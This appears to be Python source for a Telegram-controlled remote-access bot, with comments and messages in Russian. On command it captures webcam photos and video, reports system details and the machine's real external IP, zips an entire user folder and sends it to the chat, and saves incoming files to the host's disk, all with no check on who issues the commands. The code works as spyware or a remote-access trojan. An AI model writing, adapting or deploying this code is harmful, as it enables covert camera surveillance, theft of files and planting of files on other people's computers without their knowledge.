import cv2
import time
import os
import platform
import psutil
import aiohttp
import random
import string
import zipfile
from pathlib import Path

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters
)

# Путь для сохранения файлов
SAVE_DIR = r"C:\Users\anywh"
os.makedirs(SAVE_DIR, exist_ok=True)  # Создаём папку, если нет

def capture_photo(filename='photo.jpg'):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(filename, frame)
    cap.release()

def record_video(filename='video.mp4', duration=5):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    fps = 20.0
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    out = cv2.VideoWriter(filename, fourcc, fps, (width, height))

    start_time = time.time()
    while time.time() - start_time < duration:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)

    cap.release()
    out.release()

async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    capture_photo('photo.jpg')
    await update.message.reply_photo(photo=open('photo.jpg', 'rb'))
    os.remove('photo.jpg')

async def video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    record_video('video.mp4', duration=5)
    await update.message.reply_video(video=open('video.mp4', 'rb'))
    os.remove('video.mp4')

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message

    file = None
    if message.document:
        file = message.document
    elif message.photo:
        file = message.photo[-1]
    elif message.video:
        file = message.video
    else:
        await message.reply_text("Пожалуйста, отправьте файл, фото или видео.")
        return

    telegram_file = await context.bot.get_file(file.file_id)

    filename = file.file_name if hasattr(file, 'file_name') and file.file_name else f"{file.file_id}"

    save_path = os.path.join(SAVE_DIR, filename)

    try:
        await telegram_file.download_to_drive(custom_path=save_path)
        await message.reply_text(f"Файл сохранён в {save_path}")
    except Exception as e:
        await message.reply_text(f"Ошибка при сохранении файла: {e}")

async def get_real_ip():
    url = "https://api.ipify.org?format=text"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    ip = await resp.text()
                    return ip.strip()
    except Exception:
        return "Не удалось получить IP"
    return "Не удалось получить IP"

async def sysinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uname = platform.uname()
    cpu_count = psutil.cpu_count(logical=True)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage(SAVE_DIR)
    ip = await get_real_ip()

    info = (
        f"🖥️ Информация о системе:\n"
        f"Система: {uname.system}\n"
        f"Имя узла: {uname.node}\n"
        f"Релиз: {uname.release}\n"
        f"Версия: {uname.version}\n"
        f"Машина: {uname.machine}\n"
        f"Процессор: {uname.processor}\n\n"
        f"💻 CPU ядер (логических): {cpu_count}\n"
        f"🧠 Память: {memory.total // (1024**2)} МБ, доступно: {memory.available // (1024**2)} МБ\n"
        f"💾 Диск: {disk.total // (1024**3)} ГБ, свободно: {disk.free // (1024**3)} ГБ\n\n"
        f"🌐 Внешний IP (не VPN): {ip}"
    )

    await update.message.reply_text(info)

def generate_random_filename(length=12, ext='zip'):
    letters = string.ascii_lowercase + string.digits
    name = ''.join(random.choice(letters) for _ in range(length))
    return f"{name}.{ext}"

async def get_folder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    folder_path = Path(SAVE_DIR)

    if not folder_path.exists() or not folder_path.is_dir():
        await update.message.reply_text(f"Папка {SAVE_DIR} не найдена.")
        return

    archive_name = generate_random_filename()
    archive_path = os.path.join(SAVE_DIR, archive_name)

    try:
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for foldername, subfolders, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    archive.write(file_path, os.path.relpath(file_path, folder_path))

        with open(archive_path, 'rb') as f:
            await update.message.reply_document(document=f, filename=archive_name)

        os.remove(archive_path)

    except Exception as e:
        await update.message.reply_text(f"Ошибка при создании или отправке архива: {e}")

if __name__ == '__main__':
    BOT_TOKEN = ''

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler('photo', photo))
    app.add_handler(CommandHandler('video', video))
    app.add_handler(CommandHandler('sysinfo', sysinfo))
    app.add_handler(CommandHandler('getfolder', get_folder))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO | filters.VIDEO, handle_file))

    print("Бот запущен. Ожидание команд и файлов...")
    app.run_polling()
